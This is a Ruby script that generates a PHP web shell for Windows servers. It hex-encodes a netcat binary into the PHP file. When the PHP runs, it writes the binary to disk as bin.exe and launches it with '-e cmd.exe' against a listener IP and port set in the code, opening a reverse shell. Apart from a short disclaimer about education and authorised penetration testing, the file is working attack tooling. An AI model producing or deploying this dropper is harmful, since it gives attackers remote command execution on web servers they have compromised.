#!/usr/bin/ruby


# Windows PHP Reverse Shell by blkhtc0rp and Dis0rdantMel0dy
#
# $php_rshell.rb
# http://code.google.com/p/blkht-progs/
# https://snipt.net/blkhtc0rp/
# This is only for education or authorized pentesting purposes.
# Do not use this in any illegal activity!

#Some edits made to work with a simple nc.exe reverse shell payload

binario = ARGV[0]

abort("#{File.basename $0} <binary.exe>") if ARGV.length != 1
abort("Binary #{binario} does not exist!") unless File.exist?(binario) 

file = open(binario, "rb").read.unpack("H*")[0]

# !@%.. but works
cmd = %x[echo "#{file}" | fold -w 45 | sed -e 's/^/\"/g' | sed -e 's/$/\"./g' | sed '$s/.$/;/']

php = <<CODE
<?php
/*
   Windows PHP Reverse Shell by blkhtc0rp and Dis0rdantMel0dy
   This is only for education or authorized pentesting
   Do not use this in any illegal activity!
*/

$payload = #{cmd}

$host = '10.11.0.208'; //YOUR LISTENER IP GOES HERE
$port = '443'; //YOUR LISTENER PORT GOES HERE
$payload_args = '-e cmd.exe'; //YOUR PAYLOAD ARGUMENTS GO HERE

$binario = "";
for ($var=0; $var<strlen($payload); $var+=2) { $binario.=chr(hexdec($payload{$var}.$payload{($var+1)})); }
file_put_contents("bin.exe",$binario);
passthru("bin.exe " . $host . ' ' . $port . ' ' . #payload_args);
?>
CODE

open("php_rshell.php", "w") { |f| f.write(php); f.close }

if File.exist?("php_rshell.php")
  puts "Shell php_rshell.php created!"
else
  puts "Something went wrong!"
end